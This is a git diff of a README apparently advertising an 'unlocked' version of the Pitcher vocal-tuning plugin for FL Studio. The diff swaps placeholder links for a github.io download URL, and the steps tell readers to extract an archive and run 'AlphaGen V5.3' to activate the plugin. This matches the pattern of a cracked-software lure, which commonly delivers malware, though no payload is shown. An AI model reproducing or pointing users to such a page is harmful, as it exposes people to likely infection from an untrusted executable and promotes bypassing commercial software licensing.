@@ -2,13 +2,15 @@
 
 Unlock Pitcher in FL Studio to access real-time pitch correction, harmonization, and creative vocal tuning tools for professional vocal processing.
 
-[![Download](https://img.shields.io/badge/Download-Pitcher-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Pitcher-blueviolet)](https://pitcher-fl-studio.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://pitcher-fl-studio.github.io/.github
+)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Pitcher with full access
